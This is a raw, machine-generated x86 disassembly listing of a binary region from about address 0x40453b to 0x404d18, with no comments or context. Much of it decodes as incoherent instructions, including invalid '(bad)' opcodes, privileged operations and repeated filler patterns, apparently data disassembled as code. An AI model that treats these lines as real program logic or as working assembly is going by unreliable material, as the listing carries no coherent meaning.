  40453b:	and    esi,esp
  40453d:	xchg   esp,eax
  40453e:	xor    edx,ebp
  404540:	loope  0x404553
  404542:	xor    ebp,DWORD PTR [eax+0x6e452688]
  404548:	inc    DWORD PTR ss:[ebx+0x2c]
  40454c:	pop    esp
  40454d:	sar    BYTE PTR [esi],0xf6
  404550:	mov    bh,0x0
  404552:	add    BYTE PTR [eax],al
  404554:	add    BYTE PTR [eax],al
  404556:	add    eax,0xbad2b3d6
  40455b:	iret   
  40455c:	jno    0x4045ca
  40455e:	or     ebp,ecx
  404560:	das    
  404561:	push   es
  404562:	or     al,0xe4
  404564:	cld    
  404565:	jns    0x6ebb004f
  40456b:	bnd js 0x404532
  40456e:	aaa    
  40456f:	icebp  
  404570:	ss scas al,BYTE PTR es:[edi]
  404572:	dec    eax
  404573:	pushf  
  404574:	add    ch,cl
  404576:	sub    eax,0x3283c49b
  40457b:	cdq    
  40457c:	jle    0x4045bb
  40457e:	push   ebx
  40457f:	call   0x410b:0xb5845740
  404586:	add    DWORD PTR [edi-0x4729d433],ebp
  40458c:	xchg   DWORD PTR [ebp-0xb65071],edx
  404592:	mov    al,0x62
  404594:	sbb    al,0x5d
  404596:	adc    eax,0xca375e61
  40459b:	jae    0x404535
  40459d:	mov    DWORD PTR [ebx+0x74],edi
  4045a0:	(bad)  
  4045a2:	pushf  
  4045a3:	add    al,bh
  4045a5:	adc    esp,DWORD PTR [eax+0x56]
  4045a8:	mov    esi,0xb48af255
  4045ad:	(bad)  
  4045ae:	xchg   esp,eax
  4045af:	mov    ah,0xad
  4045b1:	shr    DWORD PTR [edi+0x692d9e9d],1
  4045b7:	mov    edx,0x6b97
  4045bc:	add    BYTE PTR [eax],al
  4045be:	add    BYTE PTR [ebx+0x4da99da7],bl
  4045c4:	push   eax
  4045c5:	xchg   esp,eax
  4045c6:	out    0xe4,eax
  4045c8:	cmp    BYTE PTR [ecx],0x26
  4045cb:	sar    ebp,1
  4045cd:	aaa    
  4045ce:	fs inc ebx
  4045d0:	sar    DWORD PTR [ecx],cl
  4045d2:	mov    ds:0xe03b2c85,al
  4045d7:	pop    esp
  4045d8:	xor    eax,0xf1fb3a2c
  4045dd:	and    al,0x78
  4045df:	or     edi,ebx
  4045e1:	cs mov esi,0xfc26189f
  4045e7:	mov    ds:0x43312b49,al
  4045ec:	(bad)  
  4045ed:	sub    ch,BYTE PTR [edi-0x6f]
  4045f0:	fwait
  4045f1:	sub    BYTE PTR [ebp-0xcd69c09],dh
  4045f7:	fisubr DWORD PTR [edx+esi*1+0x47]
  4045fb:	or     ch,BYTE PTR [edx+0x33]
  4045fe:	mov    DWORD PTR [eax+0x2ecb2176],edi
  404604:	shl    BYTE PTR [eax],0xd
  404607:	test   BYTE PTR [ecx+0xe723fb5],dl
  40460d:	lods   al,BYTE PTR ds:[esi]
  40460e:	and    DWORD PTR [eax],0xa6c3a643
  404614:	sti    
  404615:	sahf   
  404616:	add    eax,0x6857e4bc
  40461b:	jecxz  0x40465e
  40461d:	pop    ecx
  40461e:	es jno 0x40462f
  404621:	add    BYTE PTR [ebx+0x0],bl
  404624:	add    BYTE PTR [eax],al
  404626:	add    BYTE PTR [eax],al
  404628:	pop    ecx
  404629:	inc    esp
  40462a:	cs pop edx
  40462c:	por    mm3,QWORD PTR [eax]
  40462f:	jg     0x404605
  404631:	aam    0x9b
  404633:	jbe    0x4046a7
  404635:	cs stos DWORD PTR es:[edi],eax
  404637:	jl     0x404689
  404639:	lods   al,BYTE PTR ds:[esi]
  40463a:	bnd jne 0x404653
  40463d:	add    ebp,0x66
  404640:	mov    ds:0x8c5ff8bd,al
  404645:	addr16 iret 
  404647:	push   ebp
  404648:	dec    esi
  404649:	icebp  
  40464a:	xchg   ebp,eax
  40464b:	dec    esp
  40464c:	add    BYTE PTR [ecx+eiz*4],bl
  40464f:	sub    DWORD PTR [ebx+0x65802425],0x277212ff
  404659:	pop    ecx
  40465a:	dec    edx
  40465b:	jae    0x404646
  40465d:	mov    bl,0x7d
  40465f:	je     0x404650
  404661:	iret   
  404662:	das    
  404663:	ins    DWORD PTR es:[edi],dx
  404664:	inc    ecx
  404665:	xor    eax,0xa3736707
  40466a:	pop    esi
  40466b:	pop    esi
  40466c:	lods   eax,DWORD PTR ds:[esi]
  40466d:	mov    DWORD PTR [ecx+0x73],ebp
  404670:	div    BYTE PTR [edi-0x14]
  404673:	jb     0x4046ad
  404675:	(bad)  
  404676:	(bad)  [eax-0x36]
  404679:	dec    edx
  40467a:	and    BYTE PTR [ecx-0x4c],0xe1
  40467e:	mov    ah,0x6a
  404680:	cmp    BYTE PTR [esi],bl
  404682:	mov    BYTE PTR [ebx+0x6e],ch
  404685:	add    al,0xbf
  404687:	imul   ebp,DWORD PTR [ebp+eiz*2+0x68e6],0xea000000
  404692:	mov    eax,0xc6266dd1
  404697:	push   esp
  404698:	fs dec eax
  40469a:	pop    esp
  40469b:	arpl   WORD PTR [esi-0x66],bp
  40469e:	in     eax,dx
  40469f:	cmp    DWORD PTR [edi-0x3c],esp
  4046a2:	adc    BYTE PTR ds:0xd060e500,cl
  4046a8:	mov    al,ds:0x97b99e04
  4046ad:	div    bl
  4046af:	add    ecx,esi
  4046b1:	mul    DWORD PTR [ecx]
  4046b3:	outs   dx,BYTE PTR ds:[esi]
  4046b4:	stc    
  4046b5:	ret    0x7869
  4046b8:	jl     0x40467d
  4046ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046bb:	adc    DWORD PTR [ebx-0x4f],ecx
  4046be:	(bad)  [ebx-0x39d47fee]
  4046c4:	and    eax,0x18816fab
  4046c9:	mov    edx,0xb82feab1
  4046ce:	repz push esp
  4046d0:	jbe    0x40468b
  4046d2:	inc    ebp
  4046d3:	aas    
  4046d4:	inc    ecx
  4046d5:	in     al,dx
  4046d6:	jne    0x404701
  4046d8:	(bad)  
  4046d9:	std    
  4046da:	mov    bh,0x42
  4046dc:	repz (bad) 
  4046de:	stc    
  4046df:	cld    
  4046e0:	stos   BYTE PTR es:[edi],al
  4046e1:	out    dx,al
  4046e2:	sub    edx,DWORD PTR [edi+0x73c2799d]
  4046e8:	shr    BYTE PTR [eax-0x6c],1
  4046eb:	sbb    bh,ah
  4046ed:	push   0x3e
  4046ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046f0:	mov    esi,0x89cd806b
  4046f5:	add    BYTE PTR [eax],al
  4046f7:	add    BYTE PTR [eax],al
  4046f9:	add    BYTE PTR [esi],bh
  4046fb:	retf   
  4046fc:	fisttp DWORD PTR [edi+ebp*1]
  4046ff:	std    
  404700:	mov    al,0x3b
  404702:	sub    eax,0x1c620f47
  404707:	mov    DWORD PTR [ebp+0x55],esp
  40470a:	aaa    
  40470b:	and    ch,BYTE PTR gs:[eax+0x36]
  40470f:	xchg   ebx,eax
  404710:	inc    edi
  404711:	pop    edi
  404712:	fs shl ebp,1
  404715:	push   es
  404716:	setl   BYTE PTR gs:[ecx]
  40471a:	ror    BYTE PTR [esi-0x76],1
  40471d:	mov    ah,0xf1
  40471f:	mov    edi,ds
  404721:	xor    DWORD PTR [ebp+0x6c],0x39
  404725:	pop    esi
  404726:	lahf   
  404727:	test   BYTE PTR [ebx+0x34],bh
  40472a:	mov    BYTE PTR [edx-0x7e8afffd],ch
  404730:	push   edi
  404731:	sar    BYTE PTR [bx+0xc],1
  404735:	enter  0xb7ee,0x50
  404739:	scas   eax,DWORD PTR es:[edi]
  40473a:	dec    ebx
  40473b:	or     eax,0xacaa9721
  404740:	mov    ch,0xf0
  404742:	xchg   esi,eax
  404744:	sub    bl,BYTE PTR [edi+0x21]
  404747:	daa    
  404748:	scas   al,BYTE PTR es:[edi]
  404749:	cmp    ah,bh
  40474b:	dec    di
  40474d:	sub    BYTE PTR [edx],ah
  40474f:	xchg   edi,eax
  404750:	or     ecx,DWORD PTR [edi-0x1]
  404753:	cld    
  404754:	pop    eax
  404755:	loopne 0x4046f0
  404757:	ins    BYTE PTR es:[edi],dx
  404758:	add    al,0x87
  40475a:	je     0x4047ab
  40475c:	lods   eax,DWORD PTR ds:[esi]
  40475d:	mov    edi,0x0
  404762:	add    ch,cl
  404764:	aaa    
  404765:	sub    eax,ebx
  404767:	sub    BYTE PTR [edx-0x4a],cl
  40476a:	ja     0x4047b2
  40476c:	push   ecx
  40476d:	and    dl,BYTE PTR [eax]
  40476f:	mov    ds:0x1256fc79,eax
  404774:	xor    ah,BYTE PTR [eax+0x30]
  404777:	out    dx,eax
  404778:	iret   
  404779:	repnz sahf 
  40477b:	mov    DWORD PTR [edi+0x67],esp
  40477e:	clc    
  40477f:	fs cmp al,0x1a
  404782:	sar    BYTE PTR [ebp+0x18a7be7c],0x77
  404789:	adc    DWORD PTR [eax],ecx
  40478b:	ss test ah,0x6f
  40478f:	xchg   ebx,eax
  404790:	ss push 0xf4c6257f
  404796:	pop    ss
  404797:	or     BYTE PTR [edi+ebx*2-0x49],0x9e
  40479c:	sbb    al,0xfb
  40479e:	iret   
  40479f:	sti    
  4047a0:	add    al,BYTE PTR [ebx]
  4047a2:	lds    ebx,FWORD PTR [ebp-0x5ee7525]
  4047a8:	inc    eax
  4047a9:	cdq    
  4047aa:	mov    esi,0x19e16655
  4047af:	xor    cl,cl
  4047b1:	mov    edx,edx
  4047b3:	and    edx,esp
  4047b5:	loopne 0x40473c
  4047b7:	cmp    eax,0xdbd8e337
  4047bc:	dec    ebp
  4047bd:	jnp    0x40483c
  4047bf:	jne    0x404773
  4047c1:	(bad)  
  4047c2:	xor    ecx,DWORD PTR [ebp+0xa87629]
  4047c8:	add    BYTE PTR [eax],al
  4047ca:	add    BYTE PTR [eax],al
  4047cc:	stos   BYTE PTR es:[edi],al
  4047cd:	push   es
  4047ce:	ins    BYTE PTR es:[edi],dx
  4047cf:	cmp    eax,DWORD PTR [ebp-0x60]
  4047d2:	int3   
  4047d3:	sahf   
  4047d4:	loop   0x404850
  4047d6:	or     al,0x7e
  4047d8:	cli    
  4047d9:	mov    al,0x9c
  4047db:	fimul  DWORD PTR [edx+0x4e]
  4047de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047df:	test   DWORD PTR [edx+0x52d0f638],esi
  4047e5:	rcl    DWORD PTR [edx-0x60],cl
  4047e8:	gs jl  0x4047a6
  4047eb:	cmp    eax,DWORD PTR [edx+0x1da6a99f]
  4047f1:	add    eax,0x29ba3351
  4047f6:	cmp    ecx,ebp
  4047f8:	jmp    0x93be:0xa6cb160
  4047ff:	loope  0x404793
  404801:	call   0x4382be50
  404806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404807:	dec    edx
  404808:	bound  ecx,QWORD PTR [esi+eiz*1+0x3c6f7d8f]
  40480f:	inc    esp
  404810:	sbb    dl,BYTE PTR ds:0xf9b5977c
  404816:	mov    ebx,0x6c43c574
  40481b:	loope  0x404800
  40481d:	out    0xff,al
  40481f:	push   ebp
  404820:	adc    edi,edx
  404822:	(bad)  
  404823:	(bad)  
  404824:	mov    WORD PTR [ebx],ss
  404826:	mov    al,ds:0x193aeba3
  40482b:	jmp    0x404864
  40482d:	loop   0x4048aa
  40482f:	stc    
  404830:	add    BYTE PTR [eax],al
  404832:	add    BYTE PTR [eax],al
  404834:	add    dl,dh
  404836:	adc    BYTE PTR [edx-0x855d17f],0x62
  40483d:	bound  edi,QWORD PTR [edx]
  40483f:	cmp    eax,0x57d1d90a
  404844:	clc    
  404845:	imul   eax,DWORD PTR [edx-0x66289f4a],0xffffffd3
  40484c:	std    
  40484d:	add    cl,0x6a
  404850:	dec    ebp
  404851:	cmp    al,0x5b
  404853:	xorps  xmm5,XMMWORD PTR [ecx+0x9]
  404857:	loope  0x404840
  404859:	xor    eax,0x99278423
  40485e:	adc    dl,dl
  404860:	xchg   DWORD PTR [edx],esp
  404862:	stc    
  404863:	mov    dh,0x7d
  404865:	(bad)
  404869:	or     dh,BYTE PTR [ecx-0x55cbc7c4]
  40486f:	test   eax,edx
  404871:	pusha  
  404872:	and    al,0xd2
  404875:	sub    eax,0x692a0de2
  40487a:	cmp    ch,BYTE PTR [ebx+0x32]
  40487d:	jnp    0x404880
  40487f:	mov    ds:0xc71a47ba,al
  404884:	enter  0xc8e2,0x29
  404888:	adc    BYTE PTR [esi],bh
  40488a:	bound  ecx,QWORD PTR [ebp+ebp*4-0x67]
  40488e:	push   0xfffffff5
  404890:	sbb    eax,0x7909205
  404895:	pusha  
  404896:	xor    bh,BYTE PTR [esi-0x49]
  404899:	add    BYTE PTR [eax],al
  40489b:	add    BYTE PTR [eax],al
  40489d:	add    ah,bh
  40489f:	fstp   DWORD PTR [edx]
  4048a1:	add    BYTE PTR [edx+0x624d272c],ch
  4048a7:	nop
  4048a8:	aas    
  4048a9:	sub    BYTE PTR [eax],dh
  4048ab:	xor    eax,0x9a8c6ef
  4048b0:	mov    BYTE PTR [ebx+0x1ab0611d],ah
  4048b6:	push   ebp
  4048b7:	fst    st(6)
  4048b9:	jg     0x404932
  4048bb:	pop    eax
  4048bc:	js     0x40484f
  4048be:	jmp    ebx
  4048c0:	push   ds
  4048c1:	hlt    
  4048c2:	ja     0x404860
  4048c4:	test   BYTE PTR [ebx],0xdf
  4048c7:	and    BYTE PTR [eax+0x3ea5bd66],dl
  4048cd:	mov    BYTE PTR [ebp+0x19],dh
  4048d0:	pop    eax
  4048d1:	in     eax,dx
  4048d2:	mov    al,0x3a
  4048d4:	pusha  
  4048d5:	push   esp
  4048d6:	pop    eax
  4048d7:	jge    0x4048e0
  4048d9:	xor    DWORD PTR [edx+0x42],ecx
  4048dc:	test   al,0xdf
  4048de:	mov    dl,0x77
  4048e0:	iret   
  4048e1:	mov    edx,0xecdf17fa
  4048e6:	push   edx
  4048e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048e8:	mov    bh,0x89
  4048ea:	and    BYTE PTR [ecx],0x17
  4048ed:	addr16 cwde 
  4048ef:	popf   
  4048f0:	outs   dx,DWORD PTR ds:[esi]
  4048f1:	add    ch,BYTE PTR ds:0x45bb4875
  4048f7:	inc    edx
  4048f8:	das    
  4048f9:	fiadd  WORD PTR [edi+0x7f]
  4048fc:	xor    BYTE PTR [eax],0x2f
  4048ff:	cmp    ah,bh
  404901:	push   ebp
  404902:	add    BYTE PTR [eax],al
  404904:	add    BYTE PTR [eax],al
  404906:	add    bh,al
  404908:	mov    bl,0x9f
  40490a:	pushf  
  40490b:	(bad)
  40490f:	lea    ebp,[edi+eiz*2+0xf0f2517]
  404916:	jb     0x404898
  404918:	shl    DWORD PTR [esi],cl
  40491a:	retf   
  40491b:	or     BYTE PTR [esi+0x50],ah
  40491e:	scas   al,BYTE PTR es:[edi]
  40491f:	jne    0x40498a
  404921:	aaa    
  404922:	push   DWORD PTR ds:0x58989bf9
  404928:	cmp    DWORD PTR [edi-0x78],edi
  40492b:	es mov ecx,0x9f8beeda
  404931:	test   DWORD PTR [eax-0x63],eax
  404934:	(bad)  
  404936:	es lock stc 
  404939:	pushf  
  40493a:	pop    ds
  40493b:	push   ecx
  40493c:	cmp    BYTE PTR [eax],0x78
  40493f:	xor    al,0x24
  404941:	mov    ds:0x2febcad7,eax
  404946:	mov    al,0x3f
  404948:	mov    bh,0x2c
  40494a:	mov    dh,0xae
  40494c:	imul   BYTE PTR [eax+0x33e0c3d1]
  404952:	jle    0x404979
  404954:	popa   
  404955:	lahf   
  404956:	sbb    DWORD PTR [eax],ebp
  404958:	cld    
  404959:	into   
  40495a:	and    cl,bl
  40495c:	ret    
  40495d:	mov    al,BYTE PTR [esi+0x6c]
  404960:	popa   
  404961:	aad    0xe8
  404963:	push   edx
  404964:	jmp    0x9ea0:0xb1f78e81
  40496b:	add    BYTE PTR [eax],al
  40496d:	add    BYTE PTR [eax],al
  40496f:	add    BYTE PTR [ecx+0x2a],al
  404972:	xor    al,0xf9
  404974:	in     al,0x1b
  404976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404977:	push   esi
  404978:	mov    edx,0x4f312b53
  40497d:	add    BYTE PTR [edx-0x296f09f7],0x6d
  404984:	sbb    esp,DWORD PTR [edi+0x766dc189]
  40498a:	int    0xa5
  40498c:	pusha  
  40498d:	xchg   BYTE PTR [ebx-0x1f],al
  404990:	adc    DWORD PTR [edi-0x4f4b7971],esp
  404996:	cmp    al,0x29
  404998:	mov    dl,BYTE PTR [eax]
  40499a:	cwde   
  40499b:	dec    esi
  40499c:	aas    
  40499d:	add    bl,bl
  40499f:	in     eax,0x40
  4049a1:	xchg   ebx,eax
  4049a2:	jae    0x404a15
  4049a4:	fs js  0x404a18
  4049a7:	fdivp  st(0),st
  4049a9:	or     cl,cl
  4049ab:	jp     0x404979
  4049ad:	in     eax,dx
  4049ae:	adc    BYTE PTR [edi+0x3b293bbc],0xd3
  4049b5:	loopne 0x4049d1
  4049b7:	nop
  4049b8:	je     0x40497c
  4049ba:	add    DWORD PTR [ebx+ebx*1+0x65],0xffffffde
  4049bf:	jp     0x4049ec
  4049c1:	out    dx,al
  4049c2:	sub    eax,0x34093dde
  4049c7:	jno    0x4049ac
  4049c9:	ja     0x40498f
  4049cb:	in     eax,0x65
  4049cd:	xchg   esp,eax
  4049ce:	xor    al,0x1d
  4049d0:	mov    WORD PTR ds:0xb9b4,es
  4049d6:	add    BYTE PTR [eax],al
  4049d8:	add    bl,ah
  4049da:	and    cl,dh
  4049dc:	es inc esp
  4049de:	or     BYTE PTR [esi],0xb2
  4049e1:	or     ebx,DWORD PTR [ebx+0x33f8fbab]
  4049e7:	and    edx,DWORD PTR [edi+0x4c]
  4049ea:	xlat   BYTE PTR ds:[ebx]
  4049eb:	add    BYTE PTR [ebx+esi*4],al
  4049ee:	test   eax,0x4e5450b9
  4049f3:	jno    0x4049a6
  4049f5:	fs pushf 
  4049f7:	mov    ecx,0xcb7fcb24
  4049fc:	mov    ecx,0x1e53211c
  404a01:	repz add eax,0x4cd34eee
  404a07:	sahf   
  404a08:	add    esi,DWORD PTR [edx+ebp*4]
  404a0b:	test   BYTE PTR [eax-0x75],bl
  404a0e:	fdiv   st,st(3)
  404a10:	sti    
  404a11:	jge    0x404a46
  404a13:	in     al,0x15
  404a15:	cmp    ebp,DWORD PTR [esp+eax*4-0x3e]
  404a19:	mov    WORD PTR [edi-0x77978200],cs
  404a1f:	adc    esi,ebx
  404a21:	mov    ebp,0xc17b74a0
  404a26:	test   eax,0x5022d3cd
  404a2b:	test   al,0xd1
  404a2d:	iret   
  404a2e:	icebp  
  404a2f:	inc    ebp
  404a30:	imul   ebx,DWORD PTR [edx],0xbf212318
  404a36:	daa    
  404a37:	jne    0x4049c2
  404a39:	jo     0x404a3c
  404a3b:	adc    BYTE PTR [ebx+0x0],bh
  404a3e:	add    BYTE PTR [eax],al
  404a40:	add    BYTE PTR [eax],al
  404a42:	mov    ch,0x5f
  404a44:	(bad)  
  404a45:	and    ebp,DWORD PTR [eax-0x47]
  404a48:	fwait
  404a49:	ds sbb eax,0x8ece2291
  404a4f:	je     0x404a98
  404a51:	aam    0x1b
  404a53:	leave  
  404a54:	test   al,0x24
  404a56:	data16 xor ah,cl
  404a59:	aas    
  404a5a:	stos   BYTE PTR es:[edi],al
  404a5b:	pushf  
  404a5c:	push   es
  404a5d:	scas   eax,DWORD PTR es:[edi]
  404a5e:	pop    es
  404a5f:	jl     0x404ac4
  404a61:	xchg   ebp,eax
  404a62:	mov    dl,0xe4
  404a64:	mov    WORD PTR [ebp+0x1],es
  404a67:	inc    esp
  404a68:	call   0x514ba00d
  404a6d:	sub    al,cl
  404a6f:	in     al,dx
  404a70:	xor    edi,DWORD PTR [edx]
  404a72:	dec    edi
  404a73:	push   ebx
  404a74:	fiadd  DWORD PTR [edx+0x3abfb4a0]
  404a7a:	inc    esp
  404a7c:	jmp    0x8ca40673
  404a81:	rol    BYTE PTR [esi],1
  404a83:	std    
  404a84:	popa   
  404a85:	dec    eax
  404a86:	push   edx
  404a87:	sbb    eax,DWORD PTR [edi]
  404a89:	and    eax,0x65be3398
  404a8e:	or     eax,0x807fdad8
  404a93:	imul   esi,DWORD PTR ds:0x508fd4ff,0x0
  404a9a:	jp     0x404a66
  404a9c:	mov    eax,0xde694299
  404aa1:	cld    
  404aa2:	push   eax
  404aa3:	fdiv   QWORD PTR [eax+0x12]
  404aa6:	add    BYTE PTR [eax],al
  404aa8:	add    BYTE PTR [eax],al
  404aaa:	add    al,cl
  404aac:	pusha  
  404aad:	push   ss
  404aae:	ja     0x404ad5
  404ab0:	stos   DWORD PTR es:[edi],eax
  404ab1:	sub    eax,0x490fbdce
  404ab6:	stos   DWORD PTR es:[edi],eax
  404ab7:	iret   
  404ab8:	mov    dl,0xe5
  404aba:	inc    ebp
  404abb:	inc    edi
  404abc:	xchg   BYTE PTR [ecx-0x6e9e80e0],al
  404ac2:	jbe    0x404a9b
  404ac4:	(bad)  
  404ac6:	adc    edx,ebp
  404ac8:	push   0xd78dfd59
  404acd:	cmp    eax,0x6802098
  404ad2:	and    eax,ecx
  404ad4:	mov    esp,0x9ca4460
  404ad9:	into   
  404ada:	stos   BYTE PTR es:[edi],al
  404adb:	ret    0xa8b5
  404ade:	iret   
  404adf:	or     bh,ch
  404ae1:	inc    eax
  404ae2:	cmp    BYTE PTR [edx-0x5fa2d93f],dh
  404ae8:	hlt    
  404ae9:	mov    BYTE PTR [ebx-0x2911b7e8],dh
  404aef:	mov    ch,0x93
  404af1:	aad    0x6f
  404af3:	in     eax,dx
  404af4:	es mov cl,0xa
  404af7:	fisttp WORD PTR [ecx+0x2e57e41d]
  404afd:	jns    0x404a80
  404aff:	dec    edi
  404b00:	dec    eax
  404b01:	imul   edx,edi,0xb20df5c7
  404b07:	shl    BYTE PTR gs:[ecx-0x3a00e2a4],0x39
  404b0f:	add    BYTE PTR [eax],al
  404b11:	add    BYTE PTR [eax],al
  404b13:	add    al,dh
  404b15:	inc    BYTE PTR cs:[eax-0x1a677488]
  404b1c:	jne    0x404b0b
  404b1e:	arpl   WORD PTR [esi],si
  404b20:	jle    0x404b4f
  404b22:	lock push eax
  404b24:	pop    ebx
  404b25:	sbb    eax,0x8d1a1626
  404b2a:	test   eax,0x1f06b771
  404b2f:	fisub  WORD PTR [ecx+0x3cb9b337]
  404b35:	xchg   edx,eax
  404b36:	pop    es
  404b37:	add    ebp,0xe0e64c29
  404b3d:	aaa    
  404b3e:	add    DWORD PTR [ecx+0x2e],ecx
  404b41:	nop
  404b42:	push   esp
  404b43:	mov    ebx,DWORD PTR cs:[eax-0x4f]
  404b47:	ds sub eax,0x48591e00
  404b4d:	add    ch,BYTE PTR [ebx+0x2669b6f6]
  404b53:	xchg   ecx,eax
  404b54:	rcl    DWORD PTR [esi+0x53],cl
  404b57:	test   eax,0xce003762
  404b5c:	(bad)  
  404b5d:	cmp    al,0x4d
  404b5f:	popa   
  404b60:	or     DWORD PTR [eax+ecx*1+0x6],ebx
  404b64:	fs call 0x3:0x99750003
  404b6c:	jne    0x404b07
  404b6e:	add    eax,DWORD PTR [eax]
  404b70:	jne    0x404b0b
  404b72:	add    eax,DWORD PTR [eax]
  404b74:	jne    0x404b0f
  404b76:	add    eax,DWORD PTR [eax]
  404b78:	add    BYTE PTR [eax],al
  404b7a:	add    BYTE PTR [eax],al
  404b7c:	add    BYTE PTR [ebp-0x67],dh
  404b7f:	add    eax,DWORD PTR [eax]
  404b81:	jne    0x404b1c
  404b83:	add    eax,DWORD PTR [eax]
  404b85:	jne    0x404b20
  404b87:	add    eax,DWORD PTR [eax]
  404b89:	jne    0x404b25
  404b8b:	add    eax,DWORD PTR [eax]
  404b8d:	jne    0x404b29
  404b8f:	add    eax,DWORD PTR [eax]
  404b91:	jne    0x404b2d
  404b93:	add    eax,DWORD PTR [eax]
  404b95:	jne    0x404b31
  404b97:	add    eax,DWORD PTR [eax]
  404b99:	jne    0x404b9d
  404b9b:	jmp    0x404ba0
  404b9d:	jne    0x404ba1
  404b9f:	jmp    0x404ba4
  404ba1:	jne    0x404ba5
  404ba3:	jmp    0x404ba8
  404ba5:	jne    0x404ba9
  404ba7:	jmp    0x404bac
  404ba9:	jne    0x404bad
  404bab:	jmp    0x7503:0xea027503
  404bb2:	add    ch,dl
  404bb4:	add    esi,DWORD PTR [ebp+0x2]
  404bb7:	jmp    0x7503:0xed027503
  404bbe:	add    ah,ch
  404bc0:	add    esi,DWORD PTR [ebp+0x2]
  404bc3:	in     eax,dx
  404bc4:	add    esi,DWORD PTR [ebp+0x2]
  404bc7:	in     eax,0x3
  404bc9:	jne    0x404bcd
  404bcb:	in     al,dx
  404bcc:	add    esi,DWORD PTR [ebp+0x2]
  404bcf:	in     al,0x3
  404bd1:	jne    0x404bd5
  404bd3:	in     al,dx
  404bd4:	add    esi,DWORD PTR [ebp+0x2]
  404bd7:	in     al,0x3
  404bd9:	jne    0x404bdd
  404bdb:	jmp    0xf942c0e3
  404be0:	repnz add BYTE PTR [eax],al
  404be3:	add    BYTE PTR [eax],al
  404be5:	add    BYTE PTR [edx+eax*1-0x1f],ah
  404be9:	add    al,0x7c
  404beb:	add    al,0xe3
  404bed:	push   es
  404bee:	jle    0x404bf6
  404bf0:	cmc    
  404bf1:	add    BYTE PTR [eax+0x0],dh
  404bf4:	out    dx,eax
  404bf5:	add    ch,BYTE PTR [edx+0x2]
  404bf8:	jmp    0xe942c100
  404bfd:	add    esi,DWORD PTR [ebp+0x2]
  404c00:	jmp    0xe942c108
  404c05:	add    esi,DWORD PTR [ebp+0x2]
  404c08:	call   0xe842c110
  404c0d:	add    esi,DWORD PTR [ebp+0x2]
  404c10:	jmp    0x404c15
  404c12:	jne    0x404c16
  404c14:	jmp    0x404c19
  404c16:	jne    0x404c1a
  404c18:	add    dl,ch
  404c1a:	jbe    0x404c1e
  404c1c:	add    dl,ch
  404c1e:	jbe    0x404c22
  404c20:	add    ch,ch
  404c22:	jbe    0x404c26
  404c24:	add    ch,ah
  404c26:	jbe    0x404c2a
  404c28:	add    ah,ch
  404c2a:	jbe    0x404c2e
  404c2c:	add    ah,ah
  404c2e:	jbe    0x404c32
  404c30:	add    bh,ch
  404c32:	jbe    0x404c36
  404c34:	add    bh,ah
  404c36:	jbe    0x404c3a
  404c38:	add    dh,ch
  404c3a:	jbe    0x404c3e
  404c3c:	add    dh,ah
  404c3e:	jbe    0x404c42
  404c40:	add    cl,dh
  404c42:	jbe    0x404c46
  404c44:	add    cl,dh
  404c46:	jbe    0x404c4a
  404c48:	add    al,ah
  404c4a:	add    BYTE PTR [eax],al
  404c4c:	add    BYTE PTR [eax],al
  404c4e:	add    BYTE PTR [esi+0x2],dh
  404c51:	add    al,ah
  404c53:	jbe    0x404c57
  404c55:	add    bl,dh
  404c57:	jbe    0x404c5b
  404c59:	add    bl,dh
  404c5b:	jbe    0x404c5f
  404c5d:	add    dl,ah
  404c5f:	jbe    0x404c63
  404c61:	add    dl,ah
  404c63:	jbe    0x404c67
  404c65:	add    ch,dh
  404c67:	jbe    0x404c6b
  404c69:	add    ch,ch
  404c6b:	jbe    0x404c6f
  404c6d:	add    ah,ah
  404c6f:	jbe    0x404c73
  404c71:	add    ah,bl
  404c73:	jbe    0x404c77
  404c75:	add    cl,ch
  404c77:	jbe    0x404c7b
  404c79:	add    cl,ch
  404c7b:	jbe    0x404c7f
  404c7d:	add    cl,ch
  404c7f:	jbe    0x404c83
  404c81:	add    cl,ch
  404c83:	jbe    0x404c87
  404c85:	add    cl,ch
  404c87:	jbe    0x404c8b
  404c89:	add    cl,ch
  404c8b:	jbe    0x404c8f
  404c8d:	add    cl,ch
  404c8f:	jbe    0x404c93
  404c91:	add    cl,ch
  404c93:	jbe    0x404c97
  404c95:	add    BYTE PTR [eax],al
  404c97:	or     al,0x6
  404c99:	add    BYTE PTR [eax],al
  404c9b:	or     al,0x6
  404c9d:	add    BYTE PTR [eax],al
  404c9f:	sbb    al,0x6
  404ca1:	add    BYTE PTR [eax],al
  404ca3:	sbb    al,0x6
  404ca5:	add    BYTE PTR [eax],al
  404ca7:	or     al,0x6
  404ca9:	add    BYTE PTR [eax],al
  404cab:	or     al,0x6
  404cad:	add    BYTE PTR [eax],al
  404caf:	fadd   QWORD PTR ds:0x0
  404cb5:	add    BYTE PTR [eax],al
  404cb7:	add    ah,bl
  404cb9:	add    eax,0x5ce0000
  404cbe:	add    BYTE PTR [eax],al
  404cc0:	iret   
  404cc1:	add    eax,0x5e30000
  404cc6:	add    BYTE PTR [eax],al
  404cc8:	fadd   QWORD PTR ds:0x5c80000
  404cce:	or     BYTE PTR [eax],al
  404cd0:	dec    eax
  404cd1:	add    eax,0x5d80008
  404cd6:	or     BYTE PTR [eax],al
  404cd8:	mov    BYTE PTR ds:0x5c80008,al
  404cde:	or     BYTE PTR [eax],al
  404ce0:	sub    BYTE PTR ds:0x5f80008,al
  404ce6:	or     BYTE PTR [eax],al
  404ce8:	mov    BYTE PTR [eax+ecx*1],al
  404ceb:	add    BYTE PTR [eax-0x2],bh
  404cee:	pop    es
  404cef:	add    al,bh
  404cf1:	std    
  404cf2:	pop    es
  404cf3:	add    BYTE PTR [eax+0x180007fe],ch
  404cf9:	inc    BYTE PTR [edi]
  404cfb:	add    BYTE PTR [eax-0x2],bh
  404cfe:	pop    es
  404cff:	add    al,bl
  404d01:	inc    BYTE PTR [edi]
  404d03:	add    BYTE PTR [eax+0x180007fe],cl
  404d09:	inc    BYTE PTR [edi]
  404d0b:	add    BYTE PTR [esi+0x5],cl
  404d0e:	or     BYTE PTR [eax],al
  404d10:	into   
  404d11:	inc    BYTE PTR [edi]
  404d13:	add    BYTE PTR [ebp-0x23],dh
  404d16:	add    ecx,DWORD PTR [eax]
  404d18:	jne    0x404d77
